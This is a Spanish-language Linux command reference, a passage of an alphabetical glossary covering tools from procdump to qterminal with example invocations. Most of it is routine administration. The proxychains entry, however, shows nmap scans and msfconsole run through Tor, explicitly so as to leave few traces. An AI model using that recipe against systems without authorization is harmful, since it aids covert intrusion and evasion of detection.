# procdump -C 70 -n 3 -p PID (un volcado cada vez que el proceso llegue al 70% de uso de CPU, 3 veces, separados por 10 segundos)
# procdump -C 70 -n 3 -s 5 -p PID (un volcado cada vez que el proceso llegue al 70% de uso de CPU, hasta 3 veces y con al menos 5 segundos entre volcados)
# procdump -c 10 -C 65 -p PID (un volcado del núcleo cuando el uso de la CPU está fuera del rango entre 10 y 65)
# procdump -C 70 -M 100 -p PID (un volcado cuando el uso de CPU llegue a 70% o el uso de memoria llegue a 100 MB)


procenv
Vuelca todos los atributos de entorno en un formato analizable.
$ procenv -C (los procesos de la CPU)
$ procenv -l (mostrar los limites de los atributos de entorno)
$ procenv --format=xml --signals (mostrar todos los datos en formato XML)


procinfo
Estadisticas del sistema de /proc
$ procinfo -r (memoria libre real)
$ procinfo -n2 (actualización cada 2 segundos)
$ procinfo -d (en base a segundos en lugar de como valores totales)
$ procinfo -D (mostrar estadísticas como totales)
$ procinfo -H (en formato KiB, MiB, GiB en lugar de los Kbytes predeterminados)


procps
Explorar el "pseudo" sistema procfs, generado dinámicamente por el kernel para proporcionar información sobre el estado de las entradas en su tabla de procesos, como si el proceso se está ejecutando, detenido o "zombi". Incluye varios ejecutables; kill, sysctl, free, pgrep, pidwait, pkill, pmap, pwdx, skill, slabtop, snice, tload, top, uptime, vmstat, w y watch


procs
Herramienta que se comporta básicamente como el comando ps [ver] pero más coloreado, más legible, por columnas y vista en árbol. Descarga de https://github.com/dalance/procs/releases/tag/v0.14.0 o instalar mediante snap: snap install procs
$ procs (lanzar la aplicación)
$ procs cpu (ver datos de las cpus)


proftpd
Servidor ftp local.
# nano /etc/proftp/proftpd.conf
DefaultRoot     /home/usuario                    users, !otros
DefaultRoot     /home/usuario/servidor      otros
Indicamos que el directorio raiz de los usuarios del grupo “users” es /home/usuario  pero los del grupo “otros” solo pueden acceder al directorio servidor.
$ tail -f /var/log/proftpd  (monitorizar los logs)


progress
Herramienta que busca comandos básicos de Coreutils [cp, mv, dd, tar, gzip/gunzip, cat, etc.] que se estan ejecutando en su sistema y muestra el porcentaje de datos copiados. También puede mostrar el tiempo estimado y el rendimiento. Simplemente escanea /proc en busca de comandos para encontrar archivos abiertos e informa de su estado.
$ progreess (forma básica)
$ progress -m (monitoreo interactivo)


prompt
Sección de texto que aparece en la pantalla cuando un usuario abre una terminal o consola informática tratando de avisar al usuario de que está lista para recibir una entrada. Normalmente muestra información como nombre del usuario,  ruta donde se encuentra, símbolo del sistema operativo utilizado, instrucciones para realizar ciertas tareas o diagnósticos. Bash tiene cuatro "cadenas de prompt" que se pueden personalizar: PS0 se muestra después de cada orden, antes de cualquier salida, PS1 es el prompt principal que se muestra antes de cada orden, PS2 es el prompt secundario que se muestra cuando una orden se aplica con varias lineas de entrada, PS3 para el comando de selección y PS4 cuando se ejecuta un script de shell en modo de depuración, normalmente el signo "+". Todos los ejemplos siguientes solo se aplican a la terminal hasta que se cierre. Para hacerlos permanentes ha de colocarse la linea en .bashrc.
$ export PS1="\u@\H \W:\$ "
$ export PS1="\u@\H>\t "
$ export PS1="\u@\H>\T "
$ export PS1="\u \H\a \t "
$ export PS1="Hola \u " (Escribimos el texto o carácter que deseamos que aparezca sin la barra invertida)
Algunas de las opciones para incorporar:
        \a – Un carácter ASCII
        \d – fecha actual en formato "dia_sem mes día", "dl. d’oct. 21"
        \e – Carácter de escape
        \h – Nombre de host (corto)
        \H – Nombre de host completo
        \j – Número de trabajos que administra el shell
        \l – El nombre base del dispositivo terminal del shell
        \n – Nueva línea
        \r – Retorno de carro
        \s – El nombre del shell
        \t – Hora (hora:minuto:segundo)
        \@ – Hora, 12 horas AM/PM
        \A – Hora, 24 horas, sin segundos
        \u – Nombre de usuario actual
        \v – Versión de BASH
        \V – Información adicional sobre la versión de BASH
        \w – Directorio de trabajo actual
        \W – El nombre base del directorio de trabajo ($HOME se representa con ~)
        \! – Muestra el número de este comando en el historial
        \# – Número de comando de este comando
        \$ – Especifica si el usuario es root (#) o ($)
        \\ – Barra invertida
        \[ – inicio de una secuencia de caracteres no imprimibles
        \] – fin de la secuencia de caracteres no imprimibles
Un ejemplo para ver la cadena PS2 podria ser:
         $ echo "linux es un sistema RET
         > genial" RET
         linux es un sistema
         genial
Si modificamos la PS2:
      $ export PS2='---> '
      $ echo "linux es un sistema RET
         ---> genial" RET
         linux es un sistema
         genial
También se puede personalizar el color del prompt
$ export PS1="\e[1;31m[\u@\h \W]\$ \e[0m"
El desglose del comando es:
      \e[ – Comienza los cambios de color
      1;31m – texto en negrita y color rojo [31]
      [\u@\h \W]\$ – usuario@host directorio de trabajo $
      \e[0m – Salir del modo cambio de color
El primer número del código de color especifica el tipo de letra:
      0 – Normal
      1 – Negrita
      2 – Tenue
      4 – Subrayado
El segundo número indica el color:
      30 – Negro
      31 – Rojo
      32 – Verde
      33 – Marrón
      34 – Azul
      35 – Púrpura
      36 – Cian
      37 – Gris claro


proxychains
[tor privoxy]. Convierte en anonima la conexión que realiza una aplicación determinada [Ver privoxy]
# nano /etc/proxychains.conf
Descomentar o añadir las lineas [usar el mismo puerto que en privoxy]:
# defaults set to "tor"
socks4  127.0.0.1 9050
Iniciar tor o, caso de usar vidalia, crear nueva identidad.
# /etc/init.d/tor restart
# proxychains curl ifconfig.me (Si la ip no es la nuestra indica que todo está correctamente funcionando)
Si configuramos el navegador para usar proxy podemos comprobar su correcto funcionamiento con https://check.torproject.org/
# proxychains firefox ifconfig.me (Arrancar el navegador bajo proxy)
# proxychains nmap -Pn -sT IP (Lanzar nmap con proxy. -Pn y -sT son para dificultar en lo posible dejar trazas)
Otros ejemplos:
# proxychains nessusd -D
# proxychains msfconsole
# proxychains ssh -D 127.0.0.1:9050 usuario@host


prozilla
[libncurses5]. Gestor de descargas. La descarga se realiza en el directorio actual. Para modificar dicho directorio ha de editarse en el archivo de configuración (/etc/prozilla.conf) la opción: mainoutputdir = /home/usuario/tmp. Página: <http://old-releases.ubuntu.com/ubuntu/pool/universe/p/prozilla/>
$ proz URL


ps
Informa sobre el estado de los procesos
$ ps (muestra el PID de la consola)
$ ps -ef (lista entera y completa de los procesos del sistema )
$ ps u (muestra el usuario y la hora de inicio de los ultimos procesos ejecutados)
$ ps r (muestra solo los procesos que se estan ejecutando)
$ ps x (muestra los que no estan controlados por ninguna terminal)
$ ps S (muestra  tiempo de CPU y fallos de los procesos hijos)
$ ps aux | sort -nrk 4 | head (los 10 procesos que consumen más memoria)
$ ps -C firefox (ver los procesos asociados a una aplicación)
$ ps -l PID  (informa de la aplicación que corre por un PID)
$ ps -p $$ (informa del pid de la propia terminal)
$ ps axo pid=,stat= | awk '$2~/^Z/ { print $1 }' (Ver PID de los procesos zombies)
$ ps -a (muestra lo que se está ejecutando en ttys conocidas)
$ ps -p $(ps -o ppid= -p $$) -o comm= (da el nombre de la terminal que está corriendo: tilda, kitty, lxterminal...)
flags:
	USER (usuario que ejecuta el proceso)
	PID (número del proceso)
	%CPU (porcentaje de CPU que está utilizando)
	%MEM (porcentaje de memoria)
	RSS (cantidad de memoria en kilobytes que ha utilizado el proceso)
	TTY (consola desde la que se está ejecutando)
	Stat (muestra el estado del proceso: S "durmiendo", R "corriendo", T "parado", Z "zombie")
	START (hora a la que empezó el proceso)
	TIME (tiempo de CPU que ha usado el proceso desde su inicio)
	COMMAND (nombre del comando que se está ejecutando)


ps2pdf
[psutils]. Pasar un archivo ps a pdf
$ man -t mount | ps2pdf -  mount.pdf   (salvar a pdf una página man del comando "mount")
Convertir pdf en formato A4 a A5 para imprimir como libro con las páginas ordenadas:
$ pdftops archivo.pdf  (convertir el .pdf a .ps)
$ psbook archivo.ps | psnup -pa4 -2 > archivo_A5.ps (convertir el archivo generado de A4 a A5)
$ ps2pdf archivo_A5.ps archivo_A5.pdf  (convertir nuevamente a pdf listo para imprimir)


psad
Analiza logs de iptables para detectar y opcionalmente bloquear IPs infractoras. Herramienta formada por tres demonios del sistema que se ejecutan y analizan mensajes de registro de iptables para detectar escaneos de puertos y el resto de tráfico sospechoso. Incluye 4 herramientas: nf2csv, fwcheck_psad, kmsgsd y psadwatchd. El archivo de configuración, por defecto, se encuentra en "/etc/psad/psad.conf". Los resultados en /var/log/psad/analysis.out.
Habilitar logs en iptables:
# iptables -A INPUT -j LOG
# iptables -A FORWARD -j LOG
Lanzar los siguientes tres comandos:
# psad -R (Reiniciar psad)
# psad --sig-update (Recargar firmas para que pueda reconocer correctamente los tipos de ataques conocidos)
# psad -H (Releer archivo pad)
Consultar estado con:
# psad -status
# psad -A (analizar los logs de iptables en busca de scaneos)
# psad -A -i eth0 (Analizar a partir de los logs de iptables e indicando red)
# psad -F (eliminar cualquier bloqueo de firewall generado automáticamente)
# psad -S (Muestra el estado de cualquier proceso psad que pueda estar ejecutándose. La salida muestra una lista de los paquetes que psad ha procesado, junto con todas las direcciones IP y los niveles de peligro correspondientes que han escaneado la red)


psbook
[psutils]. Paginar un archivo ps para imprimir como libro. Ver ps2pdf.


psktool
[gnutls]. Programa que genera claves aleatorias para uso TLS-PSK. Las claves se almacenan en formato hexadecimal en un archivo de claves.
$ psktool -u USER (genera clave para el usuario mencionado y la guarda en /etc/passwd.psk)
$ psktool -u USER -p clave.psk (la guarda en el archivo clave.psk)


pslist
Examina la lista de los procesos y muestra el ID y los PIDs de los procesos hijos.
$ pslist (Muestra todo el listado)
$ pslist chromium (Mostrará sólo el de la aplicación especificada)
$ pslist 26995 (Mostrará sólo la del PID especificado)


pslog
Informar de la ruta de los registros de un proceso.
pslog PID (del pid mencionado)


ps_mem
Script de Python para conocer la memoria RAM que consume cada aplicación de nuestro equipo aunque tenga abiertos varios procesos. Descarga:
# wget https://raw.githubusercontent.com/pixelb/ps_mem/master/ps_mem.py
Tambien puede instalarse con pip caso de tenerlo instalado: # pip install ps_mem
# python ps-mem.py -S (De todos los programas que se estan ejecutando)
# python ps_mem.py -w 5 (Actualizando datos cada 5 segundos)
# python ps_mem.py -t (Mostrar el total de todos los procesos)
# python ps_mem.py -p 5123 (Mostrar el consumo del PID mencionado)


psmisc
Utilidades que utilizan el sistema de archivos proc. Incluye las aplicaciones: fuser [identifica procesos que están utilizando archivos o sockets.], killall [mata procesos por nombre], peekfd [muestra los datos que viajan sobre un descriptor de archivo], prtstat [imprime el contenido de /proc/<pid>/stat], pslog [Las utilidades que utilizan el sistema de archivos proc informan la ruta de los registros actuales de un proceso.], pstree y pstree.x11 [muestran los procesos en ejecución como un árbol].


psst
[Power Stress and Shaping Tool]. Herramienta que controla componentes Intel como CPU y GPU. Permite un control de la función de estrés sin su propia sobrecarga de proceso. Los logs en /var/log/psst.csv
# psst
# psst -v -d 10000 -s saw-tooth,5 -C a -p 500


pstotext
Lee uno o más archivos PostScript o PDF y escribe su representación en txt o en otro formato que se especifique.
$ pstotext archivo.pdf > salida.xml


pstree
Para ver el árbol de procesos
$ pstree -al   (verlo con cada uno de sus hilos de ejecución)


psutils
Colección de utilidades para manipular documentos PostScript. Se admite la selección y reorganización de páginas y la combinación de páginas para la impresión de varias páginas por cara. Incluye los siguientes programas: epsffit, extractres, fixdlsrps, fixfmps, fixmacps, fixpsditps, fixpspps, fixscribeps, fixtpps, fixwfwps, fixwpps, fixwwps, getafm, includeres, psbook, psmerge, psnup, psresize, psselect, pstops, showchar


ptop
Muestra una lista ordenada de procesos del sistema. Los procesos se ordenan con los usuarios con mayor cantidad de CPU en la parte superior. Es capaz de decodificar líneas de comando de Python, Ruby, Perl, Node, Java, bash, sh, zsh y mostrar lo que realmente se está ejecutando. Muestra una salida estable al contar el tiempo de CPU desde que se inició ptop. Proporciona un histograma de carga del sistema, tiempos de actividad y muestra la carga del sistema en relación con la cantidad de núcleos lógicos y físicos del sistema.
$ ptop


ptrepack
[pytables]. Biblioteca de Python para el manejo eficiente de grandes conjuntos de datos. Este comando permite reorganizar o comprimir los datos almacenados en archivos HDF5.
$ ptrepack input_file.h5 output_file.h5 (reorganiza un archivo HDF5 para mejorar su rendimiento o reducir el tamaño del archivo)
$ ptrepack --complevel=5 --complib=zlib input_file.h5 output_file.h5 (Aplica un nivel de compresión específico al copiar datos)
$ ptrepack --chunkshape=100 input_file.h5 output_file.h5 (reorganizar los datos para mejorar el acceso especificando un tamaño de bloque)
$ ptrepack input_file.h5:/ruta/archivo/data output_file.h5:/new/path (copiar solo una hoja o subárbol específico, puedes especificar la ruta en el archivo)
$ ptrepack --no-attrs input_file.h5 output_file.h5 (ignora metadatos para evitar copiar atributos específicos)
$ ptrepack --show-progress input_file.h5 output_file.h5 (comprobar qué estructura será empaquetada)
$ ptrepack --complib=lzo --complevel=3 input_file.h5 output_file.h5 (usar un filtro como LZO en lugar de zlib)
$ ptrepack --complevel=0 input_file.h5 output_file.h5 (hacer una copia rápida sin compresión)
$ ptrepack --h5out-version=2 input_file.h5 output_file.h5 (convierte un archivo PyTables más antiguo al formato HDF5 más reciente)


ptx
genera un índice permutado de los contenidos de un fichero, con cada palabra clave en su contexto.
$ ptx archivo.txt


pub2odg
Este paquete contiene una utilidad para convertir documentos de Publisher en documentos OpenDocument.
$ pub2odg archivo.pub archivo.odf (si se omite el archivo de salida se impreme en pantalla)


pulseaudio
Es un servidor de sonido para sistemas POSIX que gestiona el audio en múltiples aplicaciones, permitiendo mezclar streams de audio y redirigirlos a diferentes dispositivos. Incluye las herramientas pa-info, pacat, pacmd, pactl, padsp, pamon, paplay, parec, parecord, pasuspender y pax11publish.
$ pulseaudio --start (iniciar el daemon principal que gestiona todo el sistema de audio)
$ pulseaudio --kill (detener)
$ pulseaudio --kill && pulseaudio --start (reiniciar PulseAudio)
$ pa-info > audio_info.txt (información completa del sistema de audio y guardarla en un archivo)
$ pacat archivo.wav (reproducir un archivo WAV)
$ pacat --record --file-format=wav audio.wav --latency-msec=1 & sleep 5 && kill $! (grabar audio a un archivo, 5 segundos)
$ pacat --record | pacat --playback (reproducir desde micrófono directamente a altavoz [loopback])
$ pacmd list-sinks (mostrar información de sinks [dispositivos de salida])
$ pacmd list-sources (mostrar información de sources [dispositivos de entrada])
$ pacmd set-default-sink "nombre_del_sink" (cambiar sink por defecto)
$ pacmd set-default-source "nombre_del_source" (cambiar source por defecto)
$ pacmd list-clients (mostrar clients conectados)
$ pactl info (mostrar información general)
$ pactl list sinks short (listar todos los sinks)
$ pactl list sources short (listar todas las sources)
$ pactl list cards (listar tarjetas disponibles)
$ pactl set-sink-volume 0 +10% (subir volumen)
$ pactl set-sink-volume 0 -10% (bajar volumen)
$ pactl set-sink-mute 0 toggle (silenciar/desilenciar)
$ pactl set-card-profile 0 output:hdmi-stereo (cambiar perfil de tarjeta a salida HDMI)
$ pactl move-sink-input 1 2 (mover reproductor de audio entre sinks)
$ pactl load-module module-null-sink sink_name=virtual_sink (crear sink virtual para aplicaciones específicas)
$ pactl move-sink-input $(pactl list sink-inputs short | grep aplicacion | awk '{print $1}') virtual_sink (asignar aplicación al sink virtual)
$ pactl load-module module-null-sink sink_name=monitor_out && pactl load-module module-loopback source=monitor_out.monitor (monitorizar mezcla de audio)
$ paplay --device=monitor_out.monitor (reproducir la mezcla)
$ padsp mplayer -ao oss archivo.mp3 (ejecutar un reproductor que solo soporta OSS con PulseAudio)
$ pamon --device=0 (monitorizar el audio que se está reproduciendo)
$ pamon --format=s16le --channels=2 --rate=44100 (monitorizar audio con formato específico)
$ paplay audio.wav (reproduce archivos de audio)
$ paplay --device=alsa_output.pci-0000_00_1b.0.analog-stereo musica.wav (reproducir archivo con dispositivo específico)
$ cat audio.wav | paplay (reproducir desde stdin)
$ parec --format=s16le --channels=2 --rate=44100 --file-format=wav grabacion.wav (grabar audio desde dispositivos de entrada a archivo WAV)
$ parec --format=s16le | paplay (grabar audio y enviar a stdout)
$ parec --device=alsa_input.pci-0000_00_1b.0.analog-stereo grabacion.wav (grabar desde source específica)
$ parecord grabacion.wav (grabar audio)
$ parecord --channels=1 --rate=16000 grabacion_mono.wav (grabar con parámetros específicos)
$ parecord --latency-msec=1 grabacion_baja_latencia.wav (grabar con latencia baja)
$ pasuspender -- aplay archivo.wav (ejecutar una aplicación ALSA con PulseAudio suspendido)
$ pasuspender -- arecord -f cd grabacion.wav (grabar con ALSA directamente con PulseAudio suspendiso)
$ pax11publish (mostrar configuración actual de audio en X11)
$ pax11publish -s "nombre_del_sink" (establecer sink por defecto en X11)
$ pax11publish -i "nombre_del_source" (establecer source por defecto en X11)
$ pax11publish -r (eliminar publicaciones de audio en X11)


pureline
Utilidad escrita en bash que muestra de una manera distinta el prompt de la shell.
Instalación:
Instalación de pureline
	$ git clone https://github.com/chris-marsh/pureline.git
	$ cp -r pureline ~/.pureline
	$ cd pureline/
	$ cp configs/powerline_full_256col.conf ~/.pureline.conf
	$ source ~/.pureline/pureline .pureline.conf
	$ souce ~/.bashrc
El archivo de configuración está en ~/.pureline.conf. El resultado se observa al abrir una nueva terminal


purge-old-kernels
[bikeshed] Herramienta que elimina kernels antiguos, tanto los paquetes linux-image como los linux-headers, dejando por defecto solo los dos últimos .
# purge-old-kernels (forma básica)
# purge-old-kernels --keep 4 (Mantendrá los 4 últimos kernels)


pushd
Moverse al directorio especificado, como con cd, pero el directorio anterior se guarda en una pila al que puede volverse.
[~]$ pushd /usr/share/apache2/icons (del dir personal entramos en icons)
[/usr/share/apache2/icons]$ pushd /var/www/ (de icons a www)
[/var/www]$ pushd /lib/init/rw/apache2 (de www a apache2)
[/lib/init/rw/apache2]$ popd (retrocedemos un directorio en la pila)
[/var/www]$ popd (retrocedemos otro directorio de la pila)
[/usr/share/apache2/icons]$ dirs (nos informa de la pila de directorios en cada momento)


pv
Visualizar el progreso de un proceso.
$ echo "Este texto se escribirá letra a letra hasta terminar con toda la frase" |  pv -qL 10 (Escribir un texto letra a letra)
$ cat /etc/apt/sources.list | pv -qL 10  (lo mismo de un archivo)
$ pv archivo1 > archivo2  (copiar archivo mostrando el progreso)
$ pv -tpreb /dev/urandom | dd of=file.img (ejemplo hacia un archivo)
$ pv /dev/urandom -L 3m > /dev/null (otro ejemplo del comportamiento de pv)


pvdisplay
Mostrar características de un volúmen físico.
# pvdisplay /dev/sda2
# pvdisplay -s /dev/sda2 (conocer el espacio disponible en dicho un volúmen físico)


pvesh
ssh restrictivo propio de proxmox.
$ pvesh get /nodes/virtual1/qemu (Obtener un listado de todas las máquinas virtuales)
$ pvesh create /nodes/virtual1/qemu/100/status/start (Arrancar la VM con id 100)
$ pvesh get /nodes/virtual1/qemu/100/config (Obtener toda la configuración de la VM con id 100)
$ pvesh delete /nodes/virtual1/qemu/100 (Borrar la máquina virtual con id 100)
$ pvesh get /nodes/virtual1/storage (Obtener la información de los _Storages_)
$ pvesh create /access/users -userid usuario@pve (Crear usuario)
$ pvesh delete /access/users/usuario@pve (Eliminar usuario)


pwck
Verifica la integridad de los archivos de claves [/etc/passwd y /etc/shadow].
# pwck (Salida vacia significa todo correcto)
# pwck /etc/passwd


pwconv
Hace visible el archivo /etc/shadow que previamente se había hecho invisible con el comando pwunconv.
# pwconv


pwd
Mostrar el directorio actual.


pwdx
Informa del directorio actual de uno o varios procesos.
$ pwdx pid pid pid


pwgen
Genera claves aleatoriamente.
$ pwgen  (Las más simples)
$ pwgen -Bcnsy
$ pwgen -Bsy 10 1 (generar un pasword de 10 cifras con caracteres raros)
$ pwgen -Bcs 10 4 (crear 4 contraseñas de 10 caracteres)
opciones:
	-B     (ambiguas)
	-c     (con mayusculas, por defecto)
	-n     (con números)
	-y     (con símbolos)
	-s     (totalmente aleatoria)


pwman3
Interfaz para la gestión de contraseñas. Le permite almacenar su contraseña en una base de datos sqlite bloqueada por una contraseña maestra.
Algunas opciones a modificar o incorporar en el archivo de configuración:
# nano ~/.config/pwman3/config
  [Global]
  cls_timeout = 0 # (Sin borrar la pantalla. Con un número, por ejemplo 10, se borrará a los 10 segundos)
  xsel = yes
  [Generator]
  numerics = true # (crear una contraseña a partir del carácter numérico y el carácter alfabético [A-Za-z0-9])
  special_signs = true # (aceptar signos especiales tipo: "@", "#", "?", "!", '\\', "|", "$", "%", "^", "&" ...)
  default_pw_length = 40 # (longitud de la contraseña)
# pwman3 (lanzar la aplicación y entrar en el prompt)
pwman3> h (muestra las opciones disponibles)
pwman3> tags (enumera todas las etiqueta)
pwman3> l tags (los usuario englobados en la etiqueta)
pwman3> n (entrar nuevo usuario, contraseña, url y tag)
pwman3> p 2 (mostrar los datos del número 2 del listado)
pwman3> exit (salir)


pwscore
[libpwquality-tools]. Herramienta para verificar la calidad de una contraseña.
$ pwscore (pulsar intro y entrar la contraseña. El valor va de 0 a 100. Superior a 50 se considera fuerte.)
Nota.- Los mensajes de error pueden ser el tipo: "La contraseña és inferior a 8 caracteres" o si es muy simple "La contraseña no pasa la comprovación del diccionario"


pwunconv
Hace invisible el archivo /etc/shadow que previamente se había hecho visible con el comando pwconv.
# pwunconv


pydf
Muestra información sobre todos los sistemas de archivos montados de forma coloreada.
$ pydf -a (Incluye los sistemas que contengan 0 bloques)
$ pydf -h (las particiones montadas y su ocupación)
$ pydf -i (información por inodos en lugar de bloques)


pydoc
Documentación de python.
$ pydoc -p 13000 (Abrir la documentacion de python en el puerto 13000 para su acceso via navegador)
$ pydoc dbhash (información sobre el comando dbhash de python)
$ pydoc -w sha (crea el archivo sha.html para abrirlo con el navegador y modstrar la información sobre el módulo)


pygtail
Herramienta para leer archivos de registro capaz de manejar archivos de registro que rotan.
# pygtail /var/log/syslog


pyhtmlizer
Generar un documento HTML con las fuentes de un archivo en Python. Para colorear se ha de proporcionar una hoja de estilo.
$ pyhtmlizer archivo.py (Crea un html archivo.py.html que se ùede visualizar en el navegador)
$ pyhtmlizer -s URL archivo.py (la URL ha de ser el css para colorear la salida de archivo.py.html)


py-pcuinfo
Obtener información de la CPU sin necesidad de dependencias o programas adicionales.
$ py-pcuinfo


pyphoon
[python-dateutils] Muestra en ascii las fases de la luna. descarga: <https://github.com/chubin/pyphoon> . Acepta varios formatos de fecha (2017-02-01, 01/02/2017...)
$ pyphoon (En el dia de hoy y con 30 lineas [por defecto])
$ pyphoon -n 40 04-02-2917 (con 40 lineas y especificando la fecha)


pyradio
[mplayer python-pip] Emisoras de radio por consola.Descarga, descomprimir e instalar:
	$ wget https://github.com/coderholic/pyradio/archive/master.zip
	$ unzip master.zip
	$ cd pyradio-master
	# pip install pyradio
$ pyradio -l (Ver listado de emisoras)
Añadir una emisora:
	# pyradio -a
	Enter the name: "Música Classica Uruguay"
	Enter the url: "http://radio.sodreuruguay.com:9090/listen.pls"
$ pyradio (Arrancar la aplicación)


pyroom
Editor minimalista.
Atajos:
	Ctrl + h (Muestra la ayuda)
	Ctrl + i (Información del búfer)
	Ctrl + p (Abre preferencias)
	Ctrl + n (Crear nuevo buffer)
	Ctrl + o (Abrir archivo)
	Ctrl + q (salir)
	Ctrl + s (Guardar)
	Ctrl + shift + s (Guardar búfer como...)
	Ctrl + w (Cerrar búfer y salir si era el último búfer)
	Ctrl + y (Rehacer la última modificación)
	Ctrl + z (Deshacer la última modificación)
	Ctrl + RePág (Cambia al buffer anterior)
	Ctrl + AvPág (Cambia al siguiente búfer)


python
Lenguaje de programación
$ python (abre la shell de python para introducir comandos)
$ python -c 'print "x"*50'  (escribe una linea xxxxx de 50 caracteres)
$ python -m SimpleHTTPServer (Abre un servidor web en la carpeta actual. Para visualizarla desde un ordenador de la red local en el navegador con  http://ip:8000)
$ python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"  (lo mismo pero incluyendo los subdirectorios). Cancelar los procesos con Ctrol+c
$ python3 -m http.server (Otra forma de crear un servidor en el propio directorio)
$ python -m SimpleHTTPServer 8080 (crea un servidor por el puesto especificado)
$ python -m smtpd -n -c DebuggingServer localhost:25 (Iniciar un servidor de correos en el puerto especificado)
$ python -m pyftpdlib.ftpserver (inicia servidor ftp)
$ python -m webbrowser http://web.com (Abre una página en el navegador)
$ python -m urllib http://web.com (Obtener código fuente de una página)
$ python -m htmllib test.html (Eliminar etiquetas html de un archivo html)
$ python -m filecmp dir1 dir2 (Comparar dos directorios)
$ python -m calendar (Mostrar calendario)
$ python -m calendar 2013 07 (Mostrar un mes concreto de un año)
$ python -c "help('modules')" (Muestra los módulos instalados)
$ python -m platform (Como uname -a)
$ echo "Linux es un sistema genial" | python -m encodings.rot_13 (Codificar simple en ROT_13 [rotar 13 veces])
$ echo "Yvahk rf ha fvfgrzn travny" | python -m encodings.rot_13 (Descodificar en ROT_13)
$ echo "Linux es un sistema genial" | python -m base64 -e (Codificar en base64)
$ echo "TGludXggZXMgdW4gc2lzdGVtYSBnZW5pYWwK" | python -m base64 -d (Descodificar en base64)


python-hachoir-metadata
Herramientas para extraer metadatos de imagenes. Soporta 32 formatos distintos de archivos.
$ hachoir-metadata imagen


python3-docutils
El propósito del proyecto es crear un conjunto de herramientas para procesar la documentación de reStructuredText [reST] en formatos útiles, como HTML, LaTeX, ODT o páginas de manual de Unix. Esta herramientas son rst2html, rst2html4, rst2html5, rst2latex, rst2man, rst2odt, rst2odt_prepstyles, rst2pseudoxml, rst2s5, rst2xetex, rst2xml y rstpep2html.
$ rst2pdf documento.rst -o documento.pdf (convertir archivo ret a PDF)
$ rst2html documento.rst documento.html (generará un archivo documento.html de un rst que se puede abrir en un navegador)


pyversions
Muestra infromación sobre las versiones de python instaladas en el sistema.
$ pyversions -d (muestra la por defecto)
$ pyversions -s (las soportadas)
$ pyversions -i (las instaladas)


px
analiza las líneas de comando de Python, Ruby, Node, Perl, Java, bash, zh, sh y le muestra lo que realmente se está ejecutando. px puede filtrar procesos por propietario ("px root"), buscar procesos por línea de comando y enumerar los procesos en un orden útil.
$ px user
$ px root
$ px --debug firefox


qcp
[renameutils]. Funciona como qmv [ver], pero copia los archivos en lugar de renombrarlos. Mantendrá tanto los archivos originales como los duplicados.
$ qcp dir


qdbus
Herramienta para listar servicios D-Bus y sus propiedades.
$ qdbus org.kde.kded5 /kded org.kde.kded5.loadedModules | wc -l (ver módulos activos)
$ qdbus org.kde.kded5 /kded org.kde.kded5.loadedModules (ver módulos cargados)


qemu
Aplicación que emula un sistema informático completo, incluyendo procesador y varios periféricos. QEMU puede arrancar varios sistemas operativos [otros Linux, Windows, DOS, y BSD] y proveer hosting virtual a varios ordenadores virtuales en un único ordenador.
$ qemu-system-i386 -hda disco.img -m 512 -boot d -cdrom imagen.iso (emula una máquina completa con arquitectura x86 de 32 bits, i386)
$ qemu-system-x86_64 -hda disco.img -m 2G -enable-kvm (emula una máquina completa con arquitectura x86 de 64 bits)
$ qemu-system-x86_64-microvm -kernel vmlinuz -initrd initrd.img -append "console=ttyS0" -nographic (versión ligera y minimalista de la máquina virtual x86_64, diseñada para arranque rápido y bajo overhead)
$ qemu-img create -f qcow2 disco.qcow2 10G (crear una imagen de disco fr máquinas virtuales)
$ qemu-img convert -f raw -O qcow2 disco.raw disco.qcow2 (convertir formato. Formatos comunes: raw, qcow2, vmdk, vdi)
$ qemu-img info disco.qcow2 (ver información)
$ qemu-img resize disco.qcow2 +5G (redimensionar)
$ qemu-io -f qcow2 -c "read 0 512" disco.qcow2 (permite leer bloques específicos)
$ qemu-io -f raw -c "write -P 0x41 1M 4k" disco.raw (permite escribir bloques específicos)
$ qemu-storage-daemon --blockdev driver=file,filename=disco.qcow2,node-name=disk --export type=nbd,id=export,node-name=disk,name=micontenedor (Daemon que expone servicios de almacenamiento [NBD, iSCSI, etc] sin necesidad de emular una máquina completa)
Nota.- qemu-system-amd64 es un enlace simbólico o alias a qemu-system-x86_64, ya que AMD64 es el nombre original de la arquitectura x86_64 creada por AMD y adoptada por Intel como Intel 64.


qemu-nbd
Utilidad de Qemu para poder montar discos virtuales. Crea un disco de red. Es necesario cargar el módulo nbd (modprobe nbd)
# qemu-nbd -c /dev/nbd0 fichero.vdi (Crear dispositivo de disco de red a partir del fichero vdi de VirtualBox. Ahora hay que montar la partición con mount /dev/nbd0p1 /mnt)


qiv
Visor de imágenes muy pequeño y bastante rápido. Las características incluyen zoom, maxpect, reducción de escala, pantalla completa, corrección de brillo/contraste/gamma, presentación de diapositivas, desplazamiento con teclado y mouse, rotar hacia la izquierda/derecha, voltear, eliminar (mover a .qiv-trash/), saltar imagenes...
% qiv imagen.png


qmv
[renameutils]. Abrirá los nombres de los archivos en un directorio con el editor de texto predeterminado y permitirá editarlos.
$ qmv dir (renombrar los nombres de los archivos del directorio)
$ qmv -f do dir (mostrar sólo la columna del archivo de destino [f], 'do' se refiere al destino y el directorio)


qpdf
Programa para analizar y modificar la estructura de los archivos PDF.
$ qpdf --decrypt protegido.pdf salida.pdf (eliminar toda la información relativa al cifrado)
$ qpdf --show-encryption test.pdf (Ver el tipo de seguridad y cifrado utilizado)
$ qpdf --empty --pages entrada.pdf 1-5 -- salida.pdf (Extraer las primeras cinco hojas de un documento)
$ qpdf --empty --pages entrada.pdf z-1 -- salida.pdf (Reordenar las páginas de un documento en orden inverso)
$ qpdf --empty --pages doc1.pdf 1-z doc2.pdf 1-6 -- salida.pdf (Unir todo un documento con las 6 primeras páginas de otro)
$ qpdf --optimize-images entrada.pdf salida.pdf (optimiza las imágenes del PDF para optimizar el tamaño del archivo. Útil para documentos escaneados con xsane u otros programas)


qrencode
Codifica datos de entrada en código QR y los guarda en una imatgen png.
$ qrencode -o salida.png 'linux es genial' (código QR de un texto)
$ qrencode -r clave.pub -o clave.pub.png (código QR de un archivo que contiene una clave publica)


qterminal
Emulador de terminal con división de terminales horizontal y verticalmente, múltiples pestañas, colores...
$ qterminal -w /home/USER/Documentos (abrir la terminal con el directorio especificado)
$ qterminal -d (iniciar en "modo desplegable" tipo yakuake o tilda)
